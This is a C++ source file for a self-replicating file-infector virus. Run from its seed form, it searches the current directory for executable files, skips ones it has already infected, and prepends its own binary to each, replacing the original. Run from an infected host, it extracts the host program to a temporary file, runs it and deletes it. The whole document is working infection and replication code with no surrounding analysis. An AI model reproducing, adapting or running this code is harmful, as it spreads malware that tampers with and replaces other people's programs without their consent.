#include <iostream>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/sendfile.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <sys/types.h>
#include <vector>
#include <string>
#include <filesystem>
#include <fstream>

#define SIZE 45680 //size of virus in Bytes (executable compiled)

using namespace std;
namespace fs = std::filesystem;

bool is_infected(ifstream &self, ifstream &victim){
    self.seekg(0, ios::beg);
    victim.seekg(0, ios::beg);
    for (int i = 0; i < SIZE; i++){
        if (self.get() != victim.get()){
            return false;
        }
    }
    return true;
}

int main(int argc, char *argv[]){

    fs::path self_path = fs::absolute(argv[0]);
    ifstream self(argv[0], ios::binary);
    if (!self.is_open()) perror("self open");
    
    self.seekg(0, ios::end);
    size_t size = self.tellg();
    self.seekg(0, ios::beg);

    // Virus code
    cout << "I'm a virus" << endl;

    if (size != SIZE){ // Infected file
        ofstream victim("tmpfile", ios::binary);
        self.seekg(SIZE, ios::beg);
        victim << self.rdbuf();
        victim.close();
        system("chmod 111 tmpfile");
        system("./tmpfile");
        remove("tmpfile");
    }
    else{ // Seed virus
        for (auto &p : fs::directory_iterator(fs::current_path())){
            if (fs::is_regular_file(p.path()) &&                // Is a file
                p.path().filename() != self_path.filename() &&  // Isn't self
                (fs::status(p.path()).permissions() & fs::perms::owner_exec) != fs::perms::none){ // Is an executable
                cout << "Found executable: " << p.path().string() << endl;
                ifstream victim(p.path(), ios::binary);
                if (is_infected(self, victim)){
                    cout << "Already infected: " << p.path().string() << endl;
                    victim.close();
                    continue;
                }
                self.seekg(0, ios::beg);
                victim.seekg(0, ios::beg);
                ofstream infected(".tmp", ios::binary);
                infected << self.rdbuf() << victim.rdbuf();
                infected.close();
                victim.close();
                system("chmod 775 .tmp");
                remove(p.path().c_str());
                rename(".tmp", p.path().c_str());
                self.seekg(0, ios::beg);
                cout << "Infected: " << p.path().string() << endl;
            }
        }
    }
    self.close();
    return 0;
}
